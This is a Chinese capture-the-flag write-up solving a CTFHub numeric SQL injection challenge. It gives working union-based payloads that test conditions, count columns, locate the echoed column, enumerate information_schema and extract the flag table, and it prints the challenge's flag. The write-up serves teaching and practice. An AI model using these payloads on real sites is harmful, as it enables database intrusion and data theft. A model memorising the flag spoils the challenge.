---
layout: null
---

### 题目名称：injection

题目来源：CTFHub（原题：2017-赛客夏令营-Web-injection）

题目类别：Web

题目描述：

### 解题思路

页面只有一个参数 id，访问 id=1 返回一句名言，id=2 返回另一句，说明 id 是拿去查数据库的，而且被直接拼进 SQL 语句，这就是典型的 SQL 注入。

先判断类型：id=1 and 1=1 有结果，id=1 and 1=2 变成空，说明条件能生效；而 id=1' 直接空，说明不是字符型，是数字型，后面都不用加引号。

再用 order by 猜列数，2 正常、3 变空，说明是 2 列。然后用 union select 找回显位，把 id 写成 -1 让原查询不返回任何行，页面就只会显示我们注入的那一行，结果回显的是第 2 列。最后借 information_schema 查库名、表名、列名，找到 flag 表。

### 详细步骤

1. id=1 返回 Practice makes perfect.，id=2 换一句，说明 id 在查数据库

2. 判断类型

    ```
    ?id=1 and 1=1    →  有结果
    ?id=1 and 1=2    →  空        ← 条件生效
    ?id=1'           →  空        ← 加引号就崩，说明是数字型
    ```

3. 猜列数

    ```
    ?id=1 order by 2  →  正常
    ?id=1 order by 3  →  空        ← 只有 2 列
    ```

4. 找回显位。id 写 -1 让原查询没有结果，前面那部分就空了，页面只会显示 union 注入的那一行

    ```
    ?id=-1 union select 1,2   →  页面显示 2
    ```

    说明第 2 列会回显，后面想看的都放第 2 个位置

5. 查库名和版本

    ```
    ?id=-1 union select 1,database()   →  ctfhub
    ?id=-1 union select 1,version()    →  10.1.44-MariaDB
    ```

6. 查表名和列名。information_schema 是 MySQL 自带的元数据库，tables 表里记着每个库有哪些表，columns 表里记着每个表有哪些列

    ```
    ?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
    →  flag,info

    ?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database()
    →  flag,id,content
    ```

7. 查到有 flag 这张表，直接查它

    ```
    ?id=-1 union select 1,flag from flag
    ```

    页面返回 ctfhub{8d69e7660791053524e17283}，获得flag

### Payload

```
?id=-1 union select 1,flag from flag
```

### flag

ctfhub{8d69e7660791053524e17283}

### 总结&反思
